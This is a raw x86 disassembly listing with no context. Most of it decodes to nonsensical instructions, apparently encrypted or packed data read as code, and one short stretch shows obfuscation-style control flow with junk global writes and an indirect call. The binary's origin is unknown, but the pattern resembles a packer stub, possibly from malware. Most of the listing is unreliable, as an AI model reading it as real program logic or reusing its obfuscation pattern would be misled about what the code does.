  40bc58:	scas   eax,DWORD PTR es:[edi]
  40bc59:	dec    esp
  40bc5a:	jns    0x40bbf4
  40bc5c:	ja     0x40bc77
  40bc5e:	pop    ebx
  40bc5f:	mov    esi,0xf9f3c6bb
  40bc64:	les    eax,FWORD PTR [ebx+0x71]
  40bc67:	push   ss
  40bc68:	sub    BYTE PTR [edx+0x7c],bh
  40bc6b:	and    al,0x9e
  40bc6d:	cmp    al,0xd3
  40bc6f:	pop    esi
  40bc70:	cmp    DWORD PTR [ecx+0x6c],eax
  40bc73:	mov    bh,0x8c
  40bc75:	and    ch,ah
  40bc77:	mov    cl,0x74
  40bc79:	fld    DWORD PTR [edx+eiz*1+0x34]
  40bc7d:	enter  0x844,0x49
  40bc81:	inc    esi
  40bc82:	push   edi
  40bc83:	mov    ecx,0xb9fb0770
  40bc88:	out    0xb,eax
  40bc8a:	das    
  40bc8b:	cmp    al,0x64
  40bc8d:	shl    BYTE PTR [eax+0x21],1
  40bc90:	cs outs dx,BYTE PTR cs:[esi]
  40bc93:	mov    dl,0x8a
  40bc95:	sbb    eax,0x644b9e7d
  40bc9a:	jp     0x40bcca
  40bc9c:	in     eax,dx
  40bc9d:	inc    ecx
  40bc9e:	(bad)  
  40bc9f:	not    DWORD PTR [ebx]
  40bca1:	fiadd  DWORD PTR [esi]
  40bca3:	mov    esi,0x239a2bbd
  40bca8:	push   edx
  40bca9:	sbb    DWORD PTR [edx+0x12f84197],0xffffffc1
  40bcb0:	(bad)  
  40bcb1:	jnp    0x40bcb0
  40bcb3:	dec    ebx
  40bcb4:	adc    DWORD PTR [edi],eax
  40bcb6:	loope  0x40bcb5
  40bcb8:	mov    cl,0x16
  40bcba:	cmc    
  40bcbb:	out    0xc8,al
  40bcbd:	inc    esi
  40bcbe:	sbb    DWORD PTR [edx+0x7f56db7f],esi
  40bcc4:	pop    edi
  40bcc5:	fdiv   st(7),st
  40bcc7:	fmul   DWORD PTR [edi-0x1a1411a6]
  40bccd:	jo     0x40bd2e
  40bccf:	pop    ebx
  40bcd0:	fidiv  DWORD PTR [edi-0x79]
  40bcd3:	inc    ebp
  40bcd4:	retf   
  40bcd5:	inc    edx
  40bcd6:	test   DWORD PTR [edx+0x452963be],ebp
  40bcdc:	adc    al,0xed
  40bcde:	xor    DWORD PTR [eax+0x26415cce],edi
  40bce4:	jg     0x40bd41
  40bce6:	push   ecx
  40bce7:	addr16 push eax
  40bce9:	cmp    dh,BYTE PTR [eax]
  40bceb:	jg     0x40bc80
  40bced:	sub    bl,BYTE PTR [esp+ebp*4+0x24ef1743]
  40bcf4:	inc    BYTE PTR [ebp+0x7c495041]
  40bcfa:	inc    esi
  40bcfb:	or     edi,DWORD PTR [esi]
  40bcfd:	push   ecx
  40bcfe:	inc    edi
  40bcff:	mov    dl,0xb6
  40bd01:	(bad)  
  40bd03:	mov    dl,0xf4
  40bd05:	push   ds
  40bd06:	push   0x82b92edc
  40bd0b:	xor    BYTE PTR [edi+0x21],0xff
  40bd0f:	and    ebx,DWORD PTR [edi-0x79]
  40bd12:	outs   dx,DWORD PTR ds:[esi]
  40bd13:	(bad)  
  40bd14:	mov    BYTE PTR [edi],dl
  40bd16:	xchg   ebp,eax
  40bd17:	cmp    ah,BYTE PTR [eax+0x1f2f9372]
  40bd1d:	mov    bh,0xcf
  40bd1f:	dec    edx
  40bd20:	mov    WORD PTR [eax],?
  40bd22:	mov    BYTE PTR [esi+0x5d8ba19d],ch
  40bd28:	gs push ecx
  40bd2a:	mov    ds:0xb0202ee3,eax
  40bd2f:	loope  0x40bd6c
  40bd31:	push   ebx
  40bd32:	in     al,0xd
  40bd34:	inc    ecx
  40bd35:	sub    DWORD PTR [edi+ebx*1-0x2b38f9d3],0x28998df4
  40bd40:	mov    ds,WORD PTR [eax+0x64]
  40bd43:	and    eax,0x3f8c5d87
  40bd48:	push   ebp
  40bd49:	and    edx,ebp
  40bd4b:	xor    ebp,esi
  40bd4d:	sti    
  40bd4e:	adc    al,0xe3
  40bd50:	retf   
  40bd51:	stos   BYTE PTR es:[edi],al
  40bd52:	int    0x72
  40bd54:	rcl    DWORD PTR cs:[ebx+edi*1-0x4d],cl
  40bd59:	mov    bh,0x58
  40bd5b:	ss ret 0xf922
  40bd5f:	add    BYTE PTR [eax*8-0x488a718e],ch
  40bd66:	jl     0x40bd90
  40bd68:	adc    al,0xe5
  40bd6a:	es inc ebp
  40bd6c:	stos   DWORD PTR es:[edi],eax
  40bd6d:	ret    0x4411
  40bd70:	push   ecx
  40bd71:	std    
  40bd72:	mov    eax,ds:0xd42578f1
  40bd77:	(bad)  
  40bd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd79:	xchg   ebp,eax
  40bd7a:	(bad)  
  40bd7b:	mov    al,cs:0x5090847d
  40bd81:	push   eax
  40bd82:	out    dx,al
  40bd83:	jns    0x40bdc8
  40bd85:	jae    0x40bdb0
  40bd87:	pop    esi
  40bd88:	mul    DWORD PTR [edi+0x1d85f26c]
  40bd8e:	sub    ch,0x5c
  40bd91:	jecxz  0x40be12
  40bd93:	ds pop edi
  40bd95:	retf   
  40bd96:	std    
  40bd97:	push   ds
  40bd98:	dec    eax
  40bd99:	jmp    0x8b90:0xe215eee3
  40bda0:	or     al,0x0
  40bda2:	dec    esp
  40bda3:	add    DWORD PTR [edi-0x22],eax
  40bda6:	xchg   ebx,eax
  40bda7:	and    esp,esi
  40bda9:	jmp    0xc9b2:0xca439f6
  40bdb0:	adc    edi,DWORD PTR [ecx-0x3]
  40bdb3:	cmc    
  40bdb4:	leave  
  40bdb5:	cmp    BYTE PTR [ecx-0x7bb5c40],0x7c
  40bdbc:	dec    esi
  40bdbd:	std    
  40bdbe:	lds    edx,FWORD PTR [esi+0x44463c27]
  40bdc4:	adc    BYTE PTR ds:0x8f146357,al
  40bdca:	ret    
  40bdcb:	mov    bl,ah
  40bdcd:	xchg   ebp,eax
  40bdce:	or     DWORD PTR [eax+0x3f],ecx
  40bdd1:	clc    
  40bdd2:	std    
  40bdd3:	repnz scas eax,DWORD PTR es:[edi]
  40bdd5:	jb     0x40bdac
  40bdd7:	int3   
  40bdd8:	xchg   edx,eax
  40bdd9:	jmp    0x40be00
  40bddb:	push   0xec235d8c
  40bde0:	stos   DWORD PTR es:[edi],eax
  40bde1:	sub    edx,ecx
  40bde3:	xor    al,0x45
  40bde5:	sti    
  40bde6:	jne    0x40be3b
  40bde8:	mov    ebx,0xbbf771c2
  40bded:	pop    ebx
  40bdee:	push   edx
  40bdef:	lea    edi,[edx+0x200f4565]
  40bdf5:	push   ds
  40bdf6:	fdiv   DWORD PTR [edx-0x13b218bf]
  40bdfc:	mov    edi,0xaa15af8d
  40be01:	addr16 mov esi,0x536996bb
  40be07:	jae    0x40be67
  40be09:	pusha  
  40be0a:	jmp    0x40bdc9
  40be0c:	mov    al,ds:0xae59e170
  40be11:	lods   eax,DWORD PTR ds:[esi]
  40be12:	mov    al,ds:0xbf4fa59
  40be17:	inc    ebp
  40be18:	mov    DWORD PTR [ecx+0x34d55ce7],ebp
  40be1e:	push   0x2828799
  40be23:	mov    dh,0x47
  40be25:	inc    esi
  40be26:	mov    dh,0xbc
  40be28:	mov    edx,0xa4198b7c
  40be2d:	jmp    0x2dff:0x19c63c05
  40be34:	imul   edx,DWORD PTR [esi],0x59
  40be37:	cmc    
  40be38:	stos   BYTE PTR es:[edi],al
  40be39:	mov    gs,WORD PTR [edx+0x5d69d748]
  40be3f:	out    dx,eax
  40be40:	jo     0x40beb7
  40be42:	sbb    BYTE PTR [ecx+0x16a39c3d],0x59
  40be49:	test   al,0xa1
  40be4b:	sub    ah,BYTE PTR [eax]
  40be4d:	mov    ebp,0xf27d6493
  40be52:	cmp    dl,BYTE PTR ds:0xc3548650
  40be58:	aaa    
  40be59:	popf   
  40be5a:	rol    esp,cl
  40be5c:	pop    edx
  40be5d:	repz dec eax
  40be5f:	push   edx
  40be60:	sbb    cl,al
  40be62:	xor    al,BYTE PTR [edx-0x7a]
  40be65:	push   edi
  40be66:	inc    ecx
  40be67:	hlt    
  40be68:	hlt    
  40be69:	xor    dh,dl
  40be6b:	(bad)  
  40be6c:	and    ch,BYTE PTR [edi+0x4]
  40be6f:	add    dh,BYTE PTR [ebx+0x13]
  40be72:	lahf   
  40be73:	addr16 mov eax,0xd739fe49
  40be79:	es mov ebp,0xf00c0900
  40be7f:	and    cl,BYTE PTR [ebx]
  40be81:	adc    si,WORD PTR [ebp-0xb]
  40be85:	and    cl,BYTE PTR [ecx]
  40be87:	out    0x5b,eax
  40be89:	adc    edi,esp
  40be8b:	cmp    ch,dh
  40be8d:	mov    ds:0x250a68e3,eax
  40be92:	aam    0x34
  40be94:	pop    ds
  40be95:	add    al,0x9
  40be97:	mov    edx,0x39d01118
  40be9c:	push   esp
  40be9d:	lea    edx,[eax-0x7de2f183]
  40bea3:	stos   DWORD PTR es:[edi],eax
  40bea4:	push   es
  40bea5:	xchg   ebp,eax
  40bea6:	test   DWORD PTR [ebp+esi*1-0x621366fd],esp
  40bead:	mov    ebx,0x7d8b2842
  40beb2:	or     BYTE PTR [ecx+0x424435],ah
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	loop   0x40bfbf
  40c014:	xor    dl,BYTE PTR [ebx+0x7a7ae9d4]
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c04f
  40c01f:	dec    esi
  40c020:	xchg   esp,eax
  40c021:	out    dx,al
  40c022:	mov    edx,0x3bdc6a25
  40c027:	jle    0x40bffa
  40c029:	add    DWORD PTR [ebx],ebx
  40c02b:	lods   al,BYTE PTR ds:[esi]
  40c02c:	sahf   
  40c02d:	mov    dh,0xe5
  40c02f:	cmp    eax,0x86e681ff
  40c034:	(bad)  
  40c035:	push   esi
  40c036:	or     al,0x72
  40c038:	ins    BYTE PTR es:[edi],dx
  40c039:	(bad)  
  40c03a:	pop    ecx
  40c03b:	inc    esi
  40c03c:	cmp    cl,ch
  40c03e:	lods   al,BYTE PTR ds:[esi]
  40c03f:	icebp  
  40c040:	nop
  40c041:	or     cl,dl
  40c043:	daa    
  40c044:	js     0x40c05b
  40c046:	sbb    DWORD PTR [eax],edi
  40c048:	mov    ds:0x73c9a71b,al
  40c04d:	aam    0xa2
  40c04f:	fisubr WORD PTR [edi]
  40c051:	dec    edi
  40c052:	aas    
  40c053:	fldenv [edi-0x7f]
  40c056:	push   ecx
  40c057:	add    bh,ch
  40c059:	and    esi,0xffffffbf
  40c05c:	jmp    0x11dd:0x93f7ae66
  40c063:	push   esi
  40c064:	jmp    0x4131:0x430098de
  40c06b:	pop    ds
  40c06c:	adc    ebx,esi
  40c06e:	je     0x40c0a6
  40c070:	push   0x98acea05
  40c075:	leave  
  40c076:	mov    cl,0x11
  40c078:	repz dec esp
  40c07a:	in     eax,dx
  40c07b:	sub    eax,0x9d182526
  40c080:	dec    eax
  40c081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c082:	int3   
  40c083:	cmp    al,BYTE PTR [ebx+0x42cb2066]
  40c089:	pop    esi
  40c08a:	inc    edx
  40c08b:	inc    eax
  40c08c:	std    
  40c08d:	ja     0x40c0d5
  40c08f:	inc    esp
  40c090:	mov    dh,0xca
  40c092:	mov    BYTE PTR [esi-0x597cca86],bl
  40c098:	shl    ah,cl
  40c09a:	clc    
  40c09b:	or     BYTE PTR [esi+0xd],ah
  40c09e:	inc    ecx
  40c09f:	das    
  40c0a0:	push   es
  40c0a1:	imul   edi,DWORD PTR [edi-0x3ae7a04c],0xa19c715a
  40c0ab:	jo     0x40c0e6
  40c0ad:	and    esp,0x1c24c81d
  40c0b3:	xchg   esp,eax
  40c0b4:	retf   
  40c0b5:	mov    bl,0x54
  40c0b7:	pushf  
  40c0b8:	sti    
  40c0b9:	jp     0x40c138
  40c0bb:	dec    ecx
  40c0bc:	jo     0x40c10c
  40c0be:	sub    bl,al
  40c0c0:	lahf   
  40c0c1:	fsub   st,st(2)
  40c0c3:	jp     0x40c0de
  40c0c5:	enter  0x3a62,0x4f
  40c0c9:	jmp    0x40c04f
  40c0cb:	neg    bl
  40c0cd:	pop    esi
  40c0ce:	int3   
  40c0cf:	sub    BYTE PTR [eax-0xe09ccfa],ah
  40c0d5:	loope  0x40c134
  40c0d7:	out    0xf1,eax
  40c0d9:	jns    0x40c0b4
  40c0db:	push   esi
  40c0dc:	cmp    eax,0xd860c9ab
  40c0e1:	enter  0x85e8,0x77
  40c0e5:	inc    esi
  40c0e6:	scas   eax,DWORD PTR es:[edi]
  40c0e7:	xchg   edi,eax
  40c0e8:	adc    eax,DWORD PTR [ebx+eax*4]
  40c0eb:	addr16 dec ebp
  40c0ed:	pushf  
  40c0ee:	sub    DWORD PTR [edx+eax*8+0x22],0x2c8d86ea
  40c0f6:	les    esp,FWORD PTR [ebx-0xb2541b6]
  40c0fc:	mov    cs,WORD PTR [ecx]
  40c0fe:	sahf   
  40c0ff:	ror    BYTE PTR [edx],cl
  40c101:	jl     0x40c14b
  40c103:	push   0xf4de971c
  40c108:	imul   ebx,edx,0x6ea58703
  40c10e:	mov    ah,0x17
  40c110:	mov    dl,0x91
  40c112:	repnz and BYTE PTR [ebx],0x4a
  40c116:	(bad)  
  40c117:	ja     0x40c180
  40c119:	mov    edx,0x915edc70
  40c11e:	sbb    BYTE PTR [eax+0x353283b1],0xb0
  40c125:	or     DWORD PTR [ebx-0x3e],esi
  40c128:	hlt    
  40c129:	inc    ebp
  40c12a:	std    
  40c12b:	jae    0x40c127
  40c12d:	test   DWORD PTR [ecx-0x665d9207],0x57f296cf
  40c137:	inc    eax
  40c138:	and    edi,ebp
  40c13a:	loopne 0x40c173
  40c13c:	dec    ebp
  40c13d:	xchg   edx,eax
  40c13e:	add    eax,0x8366dae6
  40c143:	daa    
  40c144:	jbe    0x40c136
  40c146:	push   es
  40c147:	gs retf 
  40c149:	add    eax,0x4c92ed72
  40c14e:	fsubr  DWORD PTR [ecx-0x35365aec]
  40c154:	mov    ds:0x8ddeb5cb,ax
  40c15a:	cdq    
  40c15b:	pusha  
  40c15c:	mov    ds,WORD PTR [eax-0x41001e7a]
  40c162:	ret    
  40c163:	mov    BYTE PTR [edi],cl
  40c165:	dec    esi
  40c166:	push   edi
  40c167:	popf   
  40c168:	xchg   ecx,eax
  40c169:	jno    0x40c15b
  40c16b:	pop    eax
  40c16c:	mov    eax,ds:0x394574cc
  40c171:	push   ebx
  40c172:	(bad)  
  40c173:	ins    BYTE PTR es:[edi],dx
  40c174:	add    al,0xa7
  40c176:	imul   ecx,edx,0xa58668c8
  40c17c:	push   esp
  40c17d:	addr16 das 
  40c17f:	jnp    0x40c1f8
  40c181:	popa   
  40c182:	sub    DWORD PTR [edi+0x74],esi
  40c185:	call   0x6a10:0x8e67a69e
  40c18c:	neg    DWORD PTR [esi]
  40c18e:	cs mov cl,dl
  40c191:	div    BYTE PTR ds:0x71e2ba51
  40c197:	test   BYTE PTR [ebx+ecx*1],0xb8
  40c19b:	dec    edi
  40c19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c19d:	mov    ch,0xce
  40c19f:	test   eax,0xf9e72210
  40c1a4:	xchg   esi,eax
  40c1a5:	dec    edi
  40c1a6:	gs enter 0x7914,0x65
  40c1ab:	or     al,0xbc
  40c1ad:	mov    WORD PTR [eax+eiz*4],es
  40c1b0:	out    dx,al
  40c1b1:	sub    BYTE PTR [ebp+0x216e0b9e],ch
  40c1b7:	call   0x7da8:0xb7960fd
  40c1be:	out    0x85,al
  40c1c0:	iret   
  40c1c1:	pushf  
  40c1c2:	cs dec esi
  40c1c4:	push   ebx
  40c1c5:	icebp  
  40c1c6:	jmp    0xdae21d10
  40c1cb:	les    ebx,FWORD PTR [edi-0x578f4c17]
  40c1d1:	mov    dl,0x2b
  40c1d3:	jae    0x40c19e
  40c1d5:	pop    eax
  40c1d6:	push   esp
  40c1d7:	loop   0x40c24f
  40c1d9:	fld    QWORD PTR [ebx-0x773a947d]
  40c1df:	sub    eax,0xc2e0d1d
  40c1e4:	fist   DWORD PTR [ebx+0x5d310674]
  40c1ea:	cmp    BYTE PTR [esi],bh
  40c1ec:	bound  esi,QWORD PTR [edx+0x3e4b49b1]
  40c1f2:	sub    esi,DWORD PTR [ecx-0x71866295]
  40c1f8:	add    bh,BYTE PTR [esp+eax*4]
  40c1fb:	sbb    al,0x20
  40c1fd:	(bad)  
  40c1ff:	pop    edx
  40c200:	lods   al,BYTE PTR ds:[esi]
  40c201:	sub    eax,0x15b90797
  40c206:	mov    ebx,DWORD PTR [ecx+0x7a89c4be]
  40c20c:	pop    ss
  40c20d:	push   ebx
  40c20e:	stos   BYTE PTR es:[edi],al
  40c20f:	enter  0xe84f,0x1e
  40c213:	jnp    0x40c215
  40c215:	addr16 inc edx
  40c217:	add    bl,BYTE PTR [ebp+0x5737f729]
  40c21d:	mov    bl,0xbd
  40c21f:	shr    BYTE PTR [esi],cl
  40c221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c222:	sub    eax,0xf277c947
  40c227:	cmc    
  40c228:	mov    esi,0x938084a4
  40c22d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c22f:	jg     0x40c1ba
  40c231:	xchg   ecx,eax
  40c232:	inc    eax
  40c233:	inc    esi
  40c234:	sub    ecx,DWORD PTR [edi-0x600c3e60]
  40c23a:	xor    BYTE PTR [esi-0x5107a5f3],bl
  40c240:	mov    al,ds:0xf895e6d2
  40c245:	jge    0x40c1cf
  40c247:	or     bl,BYTE PTR [esp+ecx*4+0x271cda8d]
  40c24e:	(bad)  
  40c24f:	add    ecx,ebp
  40c251:	ins    DWORD PTR es:[edi],dx
  40c252:	sub    BYTE PTR [eax+ebx*2+0x5bbccf71],0xf1
  40c25a:	out    dx,al
  40c25b:	xchg   ebx,eax
  40c25c:	gs mov edx,0x981333e1
  40c262:	repz imul DWORD PTR [edx+0x2fbeca1f]
  40c269:	inc    eax
  40c26a:	xor    ebp,DWORD PTR [edi-0x4c]
  40c26d:	or     al,0x90
  40c26f:	dec    eax
  40c270:	popa   
  40c271:	cmp    ch,BYTE PTR [edi]
  40c273:	mov    edx,0xb06d14c8
  40c278:	ss stc 
  40c27a:	xchg   esi,eax
  40c27b:	ss sub al,0x71
  40c27e:	mov    DWORD PTR [ebp+0x1c],ecx
  40c281:	int    0xc8
  40c283:	aas    
  40c284:	xor    al,0x7e
  40c286:	int    0x4a
  40c288:	jo     0x40c28e
  40c28a:	inc    ecx
  40c28b:	or     al,0x93
  40c28d:	push   0xb698dd5a
  40c292:	imul   ebx,DWORD PTR [edi-0x52],0x2d6c0a1d
  40c299:	pop    eax
  40c29a:	add    DWORD PTR [ebp-0x49ad61dc],edx
  40c2a0:	mov    al,ds:0xf43a4e48
  40c2a5:	push   0xa8e11e1b
  40c2aa:	sub    BYTE PTR [esi+0x726782],dh
  40c2b0:	ja     0x40c2a1
  40c2b2:	xchg   esi,eax
  40c2b3:	push   ecx
  40c2b4:	mul    DWORD PTR [ebx+0x4355202c]
  40c2ba:	in     al,0x8e
  40c2bc:	jmp    0x6b43:0x5ee4835e
  40c2c3:	arpl   dx,bp
  40c2c5:	mov    BYTE PTR [ecx],bl
  40c2c7:	rcr    BYTE PTR [ebp-0x6a],1
  40c2ca:	daa    
  40c2cb:	test   BYTE PTR [esi+ecx*2+0x7554b58f],bl
  40c2d2:	lahf   
  40c2d3:	lock and cl,al
  40c2d6:	jne    0x40c275
  40c2d8:	xchg   esp,eax
  40c2d9:	pop    edi
  40c2da:	push   ebx
  40c2db:	jge    0x40c2c4
  40c2dd:	hlt    
  40c2de:	sub    eax,0x5d10e761
  40c2e3:	cmp    DWORD PTR ds:0x6343dbfc,ebx
  40c2ea:	xor    DWORD PTR [ebp-0x53],esi
  40c2ed:	xor    BYTE PTR [ebx+0x4fb47b84],0x7
  40c2f4:	pop    ds
  40c2f5:	dec    eax
  40c2f6:	imul   ecx,edx,0xe3b9b699
  40c2fc:	fisttp WORD PTR [ebx]
  40c2fe:	cmp    eax,0x17cc8662
  40c303:	push   esi
  40c304:	push   ebp
  40c305:	add    ah,cl
  40c307:	retf   
  40c308:	clc    
  40c309:	std    
  40c30a:	popa   
  40c30b:	dec    ebx
  40c30c:	pusha  
  40c30d:	fadd   st,st(1)
  40c30f:	arpl   WORD PTR [esi-0x721fdf8],cx
  40c315:	jmp    0x5e64787
  40c31a:	mov    al,ds:0x9fd1c6b2
  40c31f:	stc    
  40c320:	or     BYTE PTR [ebx*2+0x7d845476],dh
  40c327:	ja     0x40c2da
  40c329:	sti    
  40c32a:	adc    BYTE PTR [ebp-0x70],al
  40c32d:	les    esi,FWORD PTR [esi+ebp*4+0x41]
  40c331:	jmp    0x40c354
  40c333:	out    0x93,al
  40c335:	sar    BYTE PTR [ecx-0x10e9fcd4],0x73
  40c33c:	in     eax,dx
  40c33d:	sub    BYTE PTR [edx],al
  40c33f:	lahf   
  40c340:	imul   edx,DWORD PTR [ecx-0x7c],0xc421369d
  40c347:	xchg   DWORD PTR [edi-0x4645ba56],esi
  40c34d:	xchg   DWORD PTR [ecx+0x7e07f2af],ebp
  40c353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c354:	sbb    BYTE PTR [ecx+0x53],0xfa
  40c358:	xor    eax,DWORD PTR ds:[eax+ebp*4+0x19f39b2e]
  40c360:	jno    0x40c392
  40c362:	xchg   ebx,eax
  40c363:	add    bl,ah
  40c365:	mov    bl,0xa8
  40c367:	mov    ebx,0x2988e75e
  40c36c:	pop    ebp
  40c36d:	out    dx,al
  40c36e:	or     edx,DWORD PTR [esi-0x34]
  40c371:	mov    ch,0x21
  40c373:	fild   DWORD PTR [edi+0x49]
  40c376:	(bad)  
  40c377:	mov    eax,ds:0x1026b33a
  40c37c:	call   0x4218:0x7221ed70
  40c383:	hlt    
  40c384:	jge    0x40c3b0
  40c386:	or     DWORD PTR [esi+0x5e0abf2c],0x3f7283a6
  40c390:	test   al,0x74
  40c392:	jae    0x40c3ba
  40c394:	hlt    
  40c395:	das    
  40c396:	lahf   
  40c397:	repnz xchg edi,eax
  40c399:	pop    ss
  40c39a:	icebp  
  40c39b:	mov    edi,0x63de6060
  40c3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a1:	js     0x40c325
  40c3a3:	stos   BYTE PTR es:[edi],al
  40c3a4:	in     eax,dx
  40c3a5:	sbb    ah,BYTE PTR [ebx]
  40c3a7:	xor    eax,0xf7689367
  40c3ac:	ficomp WORD PTR es:[esi+ebp*8]
  40c3b0:	and    ebp,DWORD PTR [ebp-0x2bd9dfa4]
  40c3b6:	repnz mov al,dl
  40c3b9:	cld    
  40c3ba:	mov    eax,0x681e1d28
  40c3bf:	(bad)  
  40c3c0:	push   ecx
  40c3c1:	adc    BYTE PTR [ebx],dh
  40c3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c4:	sbb    al,0x5b
  40c3c6:	push   esp
  40c3c7:	outs   dx,BYTE PTR ds:[esi]
  40c3c8:	shl    ebx,0xdc
  40c3cb:	int    0xe3
  40c3cd:	sbb    DWORD PTR [esi+0x3e],ecx
  40c3d0:	adc    eax,0xf6640031
  40c3d5:	jmp    0x40c414
  40c3d7:	aam    0x4d
  40c3d9:	mov    BYTE PTR [edi+eax*2-0x31],0x91
  40c3de:	mov    DWORD PTR [edx+0x58],edi
  40c3e1:	lock mov esi,0x27fd36c5
  40c3e7:	sub    al,0xe1
  40c3e9:	dec    ebx
  40c3ea:	pushf  
  40c3eb:	jg     0x40c3f7
  40c3ed:	enter  0x57b8,0x60
  40c3f1:	mov    dh,0x38
  40c3f3:	jmp    0x40c377
  40c3f5:	sar    BYTE PTR [edx+0x6c8a2d11],0x79
  40c3fc:	push   esi
  40c3fd:	fdivr  QWORD PTR [ebx]
  40c3ff:	call   0x15de:0xafcd1d83
  40c406:	sub    dl,BYTE PTR [ebx+0x14]
  40c409:	adc    al,0x49
  40c40b:	xchg   esi,eax
  40c40c:	mov    dh,BYTE PTR [esi]
  40c40e:	add    esp,DWORD PTR [ecx]
  40c410:	aad    0x8d
  40c412:	sub    ah,BYTE PTR [esi]
  40c414:	pushf  
  40c415:	lods   al,BYTE PTR ds:[esi]
  40c416:	push   ebx
  40c417:	mov    ds:0x70f716eb,al
  40c41c:	sub    eax,0x8f693eaf
  40c421:	ret    0xacd4
  40c424:	xchg   ecx,eax
  40c425:	mov    edi,0xcda3a5cc
  40c42a:	bound  eax,QWORD PTR [edx-0x22]
  40c42d:	xor    BYTE PTR [ecx+0x29800d6c],bh
  40c433:	popa   
  40c434:	icebp  
  40c435:	mov    ch,0xc2
  40c437:	mov    cl,BYTE PTR ds:0x7165e00f
  40c43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c43e:	dec    ebp
  40c43f:	push   edx
  40c440:	xchg   ebp,eax
  40c441:	ins    BYTE PTR es:[edi],dx
  40c442:	cmp    BYTE PTR [edi-0x85776c3],ch
  40c448:	mov    eax,ds:0x52ad3a3e
  40c44d:	and    ch,bh
  40c44f:	lods   eax,DWORD PTR ds:[esi]
  40c450:	mov    ds:0xbae66b4d,eax
  40c455:	(bad)  
  40c456:	push   edx
  40c457:	jmp    0x4680:0x4b9f25e7
  40c45e:	shl    DWORD PTR es:[ecx+0x14],cl
  40c462:	aaa    
  40c463:	(bad)  
  40c465:	std    
  40c466:	sti    
  40c467:	adc    ch,BYTE PTR [edi-0x15ac2df8]
  40c46d:	mov    esi,DWORD PTR [edx]
  40c46f:	xchg   DWORD PTR [esi],esi
  40c471:	repz inc ebp
  40c473:	dec    esi
  40c474:	loope  0x40c4e3
  40c476:	std    
  40c477:	(bad)  
  40c478:	xchg   edi,eax
  40c479:	pop    edx
  40c47a:	jecxz  0x40c4e9
  40c47c:	dec    edx
  40c47d:	dec    eax
  40c47e:	loopne 0x40c4d4
  40c480:	cmp    eax,0xef006129
  40c485:	(bad)  
  40c486:	xlat   BYTE PTR ds:[ebx]
  40c487:	sbb    ebx,DWORD PTR [esi+0x1b2f489e]
  40c48d:	icebp  
  40c48e:	add    al,0x18
  40c490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c491:	outs   dx,DWORD PTR ds:[esi]
  40c492:	pop    edx
  40c493:	scas   eax,DWORD PTR es:[edi]
  40c494:	out    0xae,al
  40c496:	jge    0x40c4b3
  40c498:	and    eax,0xe280bd07
  40c49d:	dec    esp
  40c49e:	js     0x40c4ae
